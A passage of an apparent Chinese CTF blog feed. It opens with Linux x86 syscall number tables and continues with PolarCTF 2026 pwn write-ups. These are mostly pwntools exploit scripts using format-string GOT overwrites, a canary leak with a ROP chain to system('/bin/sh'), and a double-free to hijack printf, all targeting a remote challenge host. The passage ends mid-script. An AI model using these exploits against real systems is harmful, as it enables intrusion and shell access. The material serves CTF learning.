331<br>#define NR_inotify_init1 332<br>#define NR_preadv 333<br>#define NR_pwritev 334<br>#define NR_rt_tgsigqueueinfo 335<br>#define NR_perf_event_open 336<br>#define NR_recvmmsg 337<br>#define NR_fanotify_init 338<br>#define NR_fanotify_mark 339<br>#define NR_prlimit64 340<br>#define NR_name_to_handle_at 341<br>#define NR_open_by_handle_at 342<br>#define NR_clock_adjtime 343<br>#define NR_syncfs 344<br>#define NR_sendmmsg 345<br>#define NR_setns 346<br>#define NR_process_vm_readv 347<br>#define NR_process_vm_writev 348<br>#define NR_kcmp 349<br>#define NR_finit_module 350<br>#define NR_sched_setattr 351<br>#define NR_sched_getattr 352<br>#define NR_renameat2 353<br>#define NR_seccomp 354<br>#define NR_getrandom 355<br>#define NR_memfd_create 356<br>#define NR_bpf 357<br>#define NR_execveat 358<br>#define NR_socket 359<br>#define NR_socketpair 360<br>#define NR_bind 361<br>#define NR_connect 362<br>#define NR_listen 363<br>#define NR_accept4 364<br>#define NR_getsockopt 365<br>#define NR_setsockopt 366<br>#define NR_getsockname 367<br>#define NR_getpeername 368<br>#define NR_sendto 369<br>#define NR_sendmsg 370<br>#define NR_recvfrom 371<br>#define NR_recvmsg 372<br>#define NR_shutdown 373<br>#define NR_userfaultfd 374<br>#define NR_membarrier 375<br>#define NR_mlock2 376<br>#define NR_copy_file_range 377<br>#define NR_preadv2 378<br>#define __NR_pwritev2 379<br><br>#endif /* _ASM_X86_UNISTD_32_H */<br></code></pre></td></tr></table></figure><h1 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#ifndef _ASM_X86_UNISTD_64_H<br>#define _ASM_X86_UNISTD_64_H 1<br><br>#define NR_read 0<br>#define NR_write 1<br>#define NR_open 2<br>#define NR_close 3<br>#define NR_stat 4<br>#define NR_fstat 5<br>#define NR_lstat 6<br>#define NR_poll 7<br>#define NR_lseek 8<br>#define NR_mmap 9<br>#define NR_mprotect 10<br>#define NR_munmap 11<br>#define NR_brk 12<br>#define NR_rt_sigaction 13<br>#define NR_rt_sigprocmask 14<br>#define NR_rt_sigreturn 15<br>#define NR_ioctl 16<br>#define NR_pread64 17<br>#define NR_pwrite64 18<br>#define NR_readv 19<br>#define NR_writev 20<br>#define NR_access 21<br>#define NR_pipe 22<br>#define NR_select 23<br>#define NR_sched_yield 24<br>#define NR_mremap 25<br>#define NR_msync 26<br>#define NR_mincore 27<br>#define NR_madvise 28<br>#define NR_shmget 29<br>#define NR_shmat 30<br>#define NR_shmctl 31<br>#define NR_dup 32<br>#define NR_dup2 33<br>#define NR_pause 34<br>#define NR_nanosleep 35<br>#define NR_getitimer 36<br>#define NR_alarm 37<br>#define NR_setitimer 38<br>#define NR_getpid 39<br>#define NR_sendfile 40<br>#define NR_socket 41<br>#define NR_connect 42<br>#define NR_accept 43<br>#define NR_sendto 44<br>#define NR_recvfrom 45<br>#define NR_sendmsg 46<br>#define NR_recvmsg 47<br>#define NR_shutdown 48<br>#define NR_bind 49<br>#define NR_listen 50<br>#define NR_getsockname 51<br>#define NR_getpeername 52<br>#define NR_socketpair 53<br>#define NR_setsockopt 54<br>#define NR_getsockopt 55<br>#define NR_clone 56<br>#define NR_fork 57<br>#define NR_vfork 58<br>#define NR_execve 59<br>#define NR_exit 60<br>#define NR_wait4 61<br>#define NR_kill 62<br>#define NR_uname 63<br>#define NR_semget 64<br>#define NR_semop 65<br>#define NR_semctl 66<br>#define NR_shmdt 67<br>#define NR_msgget 68<br>#define NR_msgsnd 69<br>#define NR_msgrcv 70<br>#define NR_msgctl 71<br>#define NR_fcntl 72<br>#define NR_flock 73<br>#define NR_fsync 74<br>#define NR_fdatasync 75<br>#define NR_truncate 76<br>#define NR_ftruncate 77<br>#define NR_getdents 78<br>#define NR_getcwd 79<br>#define NR_chdir 80<br>#define NR_fchdir 81<br>#define NR_rename 82<br>#define NR_mkdir 83<br>#define NR_rmdir 84<br>#define NR_creat 85<br>#define NR_link 86<br>#define NR_unlink 87<br>#define NR_symlink 88<br>#define NR_readlink 89<br>#define NR_chmod 90<br>#define NR_fchmod 91<br>#define NR_chown 92<br>#define NR_fchown 93<br>#define NR_lchown 94<br>#define NR_umask 95<br>#define NR_gettimeofday 96<br>#define NR_getrlimit 97<br>#define NR_getrusage 98<br>#define NR_sysinfo 99<br>#define NR_times 100<br>#define NR_ptrace 101<br>#define NR_getuid 102<br>#define NR_syslog 103<br>#define NR_getgid 104<br>#define NR_setuid 105<br>#define NR_setgid 106<br>#define NR_geteuid 107<br>#define NR_getegid 108<br>#define NR_setpgid 109<br>#define NR_getppid 110<br>#define NR_getpgrp 111<br>#define NR_setsid 112<br>#define NR_setreuid 113<br>#define NR_setregid 114<br>#define NR_getgroups 115<br>#define NR_setgroups 116<br>#define NR_setresuid 117<br>#define NR_getresuid 118<br>#define NR_setresgid 119<br>#define NR_getresgid 120<br>#define NR_getpgid 121<br>#define NR_setfsuid 122<br>#define NR_setfsgid 123<br>#define NR_getsid 124<br>#define NR_capget 125<br>#define NR_capset 126<br>#define NR_rt_sigpending 127<br>#define NR_rt_sigtimedwait 128<br>#define NR_rt_sigqueueinfo 129<br>#define NR_rt_sigsuspend 130<br>#define NR_sigaltstack 131<br>#define NR_utime 132<br>#define NR_mknod 133<br>#define NR_uselib 134<br>#define NR_personality 135<br>#define NR_ustat 136<br>#define NR_statfs 137<br>#define NR_fstatfs 138<br>#define NR_sysfs 139<br>#define NR_getpriority 140<br>#define NR_setpriority 141<br>#define NR_sched_setparam 142<br>#define NR_sched_getparam 143<br>#define NR_sched_setscheduler 144<br>#define NR_sched_getscheduler 145<br>#define NR_sched_get_priority_max 146<br>#define NR_sched_get_priority_min 147<br>#define NR_sched_rr_get_interval 148<br>#define NR_mlock 149<br>#define NR_munlock 150<br>#define NR_mlockall 151<br>#define NR_munlockall 152<br>#define NR_vhangup 153<br>#define NR_modify_ldt 154<br>#define NR_pivot_root 155<br>#define NRsysctl 156<br>#define NR_prctl 157<br>#define NR_arch_prctl 158<br>#define NR_adjtimex 159<br>#define NR_setrlimit 160<br>#define NR_chroot 161<br>#define NR_sync 162<br>#define NR_acct 163<br>#define NR_settimeofday 164<br>#define NR_mount 165<br>#define NR_umount2 166<br>#define NR_swapon 167<br>#define NR_swapoff 168<br>#define NR_reboot 169<br>#define NR_sethostname 170<br>#define NR_setdomainname 171<br>#define NR_iopl 172<br>#define NR_ioperm 173<br>#define NR_create_module 174<br>#define NR_init_module 175<br>#define NR_delete_module 176<br>#define NR_get_kernel_syms 177<br>#define NR_query_module 178<br>#define NR_quotactl 179<br>#define NR_nfsservctl 180<br>#define NR_getpmsg 181<br>#define NR_putpmsg 182<br>#define NR_afs_syscall 183<br>#define NR_tuxcall 184<br>#define NR_security 185<br>#define NR_gettid 186<br>#define NR_readahead 187<br>#define NR_setxattr 188<br>#define NR_lsetxattr 189<br>#define NR_fsetxattr 190<br>#define NR_getxattr 191<br>#define NR_lgetxattr 192<br>#define NR_fgetxattr 193<br>#define NR_listxattr 194<br>#define NR_llistxattr 195<br>#define NR_flistxattr 196<br>#define NR_removexattr 197<br>#define NR_lremovexattr 198<br>#define NR_fremovexattr 199<br>#define NR_tkill 200<br>#define NR_time 201<br>#define NR_futex 202<br>#define NR_sched_setaffinity 203<br>#define NR_sched_getaffinity 204<br>#define NR_set_thread_area 205<br>#define NR_io_setup 206<br>#define NR_io_destroy 207<br>#define NR_io_getevents 208<br>#define NR_io_submit 209<br>#define NR_io_cancel 210<br>#define NR_get_thread_area 211<br>#define NR_lookup_dcookie 212<br>#define NR_epoll_create 213<br>#define NR_epoll_ctl_old 214<br>#define NR_epoll_wait_old 215<br>#define NR_remap_file_pages 216<br>#define NR_getdents64 217<br>#define NR_set_tid_address 218<br>#define NR_restart_syscall 219<br>#define NR_semtimedop 220<br>#define NR_fadvise64 221<br>#define NR_timer_create 222<br>#define NR_timer_settime 223<br>#define NR_timer_gettime 224<br>#define NR_timer_getoverrun 225<br>#define NR_timer_delete 226<br>#define NR_clock_settime 227<br>#define NR_clock_gettime 228<br>#define NR_clock_getres 229<br>#define NR_clock_nanosleep 230<br>#define NR_exit_group 231<br>#define NR_epoll_wait 232<br>#define NR_epoll_ctl 233<br>#define NR_tgkill 234<br>#define NR_utimes 235<br>#define NR_vserver 236<br>#define NR_mbind 237<br>#define NR_set_mempolicy 238<br>#define NR_get_mempolicy 239<br>#define NR_mq_open 240<br>#define NR_mq_unlink 241<br>#define NR_mq_timedsend 242<br>#define NR_mq_timedreceive 243<br>#define NR_mq_notify 244<br>#define NR_mq_getsetattr 245<br>#define NR_kexec_load 246<br>#define NR_waitid 247<br>#define NR_add_key 248<br>#define NR_request_key 249<br>#define NR_keyctl 250<br>#define NR_ioprio_set 251<br>#define NR_ioprio_get 252<br>#define NR_inotify_init 253<br>#define NR_inotify_add_watch 254<br>#define NR_inotify_rm_watch 255<br>#define NR_migrate_pages 256<br>#define NR_openat 257<br>#define NR_mkdirat 258<br>#define NR_mknodat 259<br>#define NR_fchownat 260<br>#define NR_futimesat 261<br>#define NR_newfstatat 262<br>#define NR_unlinkat 263<br>#define NR_renameat 264<br>#define NR_linkat 265<br>#define NR_symlinkat 266<br>#define NR_readlinkat 267<br>#define NR_fchmodat 268<br>#define NR_faccessat 269<br>#define NR_pselect6 270<br>#define NR_ppoll 271<br>#define NR_unshare 272<br>#define NR_set_robust_list 273<br>#define NR_get_robust_list 274<br>#define NR_splice 275<br>#define NR_tee 276<br>#define NR_sync_file_range 277<br>#define NR_vmsplice 278<br>#define NR_move_pages 279<br>#define NR_utimensat 280<br>#define NR_epoll_pwait 281<br>#define NR_signalfd 282<br>#define NR_timerfd_create 283<br>#define NR_eventfd 284<br>#define NR_fallocate 285<br>#define NR_timerfd_settime 286<br>#define NR_timerfd_gettime 287<br>#define NR_accept4 288<br>#define NR_signalfd4 289<br>#define NR_eventfd2 290<br>#define NR_epoll_create1 291<br>#define NR_dup3 292<br>#define NR_pipe2 293<br>#define NR_inotify_init1 294<br>#define NR_preadv 295<br>#define NR_pwritev 296<br>#define NR_rt_tgsigqueueinfo 297<br>#define NR_perf_event_open 298<br>#define NR_recvmmsg 299<br>#define NR_fanotify_init 300<br>#define NR_fanotify_mark 301<br>#define NR_prlimit64 302<br>#define NR_name_to_handle_at 303<br>#define NR_open_by_handle_at 304<br>#define NR_clock_adjtime 305<br>#define NR_syncfs 306<br>#define NR_sendmmsg 307<br>#define NR_setns 308<br>#define NR_getcpu 309<br>#define NR_process_vm_readv 310<br>#define NR_process_vm_writev 311<br>#define NR_kcmp 312<br>#define NR_finit_module 313<br>#define NR_sched_setattr 314<br>#define NR_sched_getattr 315<br>#define NR_renameat2 316<br>#define NR_seccomp 317<br>#define NR_getrandom 318<br>#define NR_memfd_create 319<br>#define NR_kexec_file_load 320<br>#define NR_bpf 321<br>#define NR_execveat 322<br>#define NR_userfaultfd 323<br>#define NR_membarrier 324<br>#define NR_mlock2 325<br>#define NR_copy_file_range 326<br>#define NR_preadv2 327<br>#define NR_pwritev2 328<br><br>#endif /* _ASM_X86_UNISTD_64_H */<br></code></pre></td></tr></table></figure>]]>
    </content>
    <id>http://example.com/2026/04/24/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7/</id>
    <link href="http://example.com/2026/04/24/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7/"/>
    <published>2026-04-24T00:55:56.000Z</published>
    <summary>
      <![CDATA[<h1 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre>]]>
    </summary>
    <title>系统调用号</title>
    <updated>2026-04-24T00:55:56.170Z</updated>
  </entry>
  <entry>
    <author>
      <name>haoo</name>
    </author>
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    <content>
      <![CDATA[<h1 id="one-hundred"><a href="#one-hundred" class="headerlink" title="one_hundred"></a>one_hundred</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./one_hundred&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2149<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>n_addr = 0x0804A06C<br>printf_got = elf.got[&quot;printf&quot;]<br>system_plt = elf.plt[&quot;system&quot;]<br><br><br>#gdb.attach(io,&quot;b *0x08048642\nc&quot;)<br>p0 = p32(n_addr) + b&quot;%96c%4$hn&quot;<br>sl(p0)<br><br>p1 = fmtstr_payload(4,&#123;printf_got:system_plt&#125;)<br>sl(p1)<br><br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="where-sh"><a href="#where-sh" class="headerlink" title="where_sh"></a>where_sh</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./where_sh&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2086<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>bss_addr = 0x0804A06C<br>gets_plt = elf.plt[&quot;gets&quot;]<br>system_plt = elf.plt[&quot;system&quot;]<br><br>p0 = b&quot;%27$p&quot;<br>sl(p0)<br>io.recvuntil(b&quot;0x&quot;)<br>canary = i32(8)<br>leak(&quot;canary&quot;,canary)<br><br>p0 = cyclic(0x5c - 0xc) + p32(canary) + cyclic(0xc) + p32(gets_plt) + p32(system_plt) + p32(bss_addr) + p32(bss_addr)<br>sl(p0)<br>sl(b&quot;/bin/sh\x00&quot;)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="z99"><a href="#z99" class="headerlink" title="z99"></a>z99</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./z99&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(pwn_file)<br>#ibc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=1<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2147<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br><br>z99_addr =0x000000000060108C<br><br>gdb.attach(io)<br>p0 = p64(0) * 3 + p64(0x21) + p64(0) + p64(z99_addr)<br>sl(p0)<br>sl(p64(0x11))<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="2free"><a href="#2free" class="headerlink" title="2free"></a>2free</h1><p><img src="/images/PolarCTF2026%E6%98%A5%E5%AD%A3%E8%B5%9B_2free_1.png"></p><p>64位题目，开启了NX与canary保护，是一道堆题目。</p><p><img src="/images/PolarCTF2026%E6%98%A5%E5%AD%A3%E8%B5%9B_2free_2.png"></p><p><img src="/images/PolarCTF2026%E6%98%A5%E5%AD%A3%E8%B5%9B_2free_3.png"></p><p>发现delete函数中进行free后并没有将指针为空，那么这里就存在double free漏洞，且存在shell函数。那么大致的想法就是利用double free将printf的got表修改为shell函数的地址，执行show函数中printf的时候就相当于执行shell函数，从而获取shell了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./2free&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2106<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>def create(size):<br>    sla(&quot;4.show\n&quot;,b&quot;1&quot;)<br>    sla(&quot;Size: \n&quot;,str(size))<br><br>def edit(index,content):<br>    sla(&quot;4.show\n&quot;,b&quot;2&quot;)<br>    sla(&quot;Index: \n&quot;,str(index))<br>    sla(&quot;Contents: \n&quot;,content)<br><br>def delete(index):<br>    sla(&quot;4.show\n&quot;,b&quot;3&quot;)<br>    sla(&quot;Index: \n&quot;,str(index))<br><br>def show(index):<br>    sl(b&quot;4&quot;)<br>    sl(str(index))<br><br>shell_addr = 0x400C26<br>printf_got_addr = elf.got[&#x27;printf&#x27;]<br>back =printf_got_addr - 22<br><br>create(0x30)<br>create(0x30)<br><br>delete(0)<br>delete(1)<br>delete(0)<br>#gdb.attach(io)<br><br>create(0x30)<br>edit(0,p64(back))<br>create(0x30)<br>create(0x30)<br>create(0x30)<br>content = b&#x27;\x40\x00\x00\x00\x00\x00&#x27; + p64(shell_addr) + b&quot;\x56\x07\x40\x00\x00\x00\x00\x00&quot;<br>edit(5,content)<br>show(5)<br><br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="bank"><a href="#bank" class="headerlink" title="bank"></a>bank</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./bank&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2069<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : io.recvline()<br>ru = lambda delims, drop = True : io.recvuntil(delims, drop)<br>leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>i32=lambda data: int(io.recv(data), 16)<br>i64=lambda data: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>money_addr = 0x0804A06C<br><br>p0 = p32(money_addr) + b&quot;%9995c%6$hn&quot;<br>sl(p0)<br><br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure><h1 id="littlecan"><a href="#littlecan" class="headerlink" title="littlecan"></a>littlecan</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./littlecan&#x27;<br>#libc_file=&#x27;&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;1.95.36.136&#x27;<br>    port=2109<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s = lambda data : io.send(data)<br>sa = lambda delim,data : io.sendafter(str(delim), data)<br>sl = lambda data : io.sendline(data)<br>sla = lambda delim,data : io.sendlineafter(str(delim), data)<br>r = lambda num : io.recv(num)<br>rl=lambda : 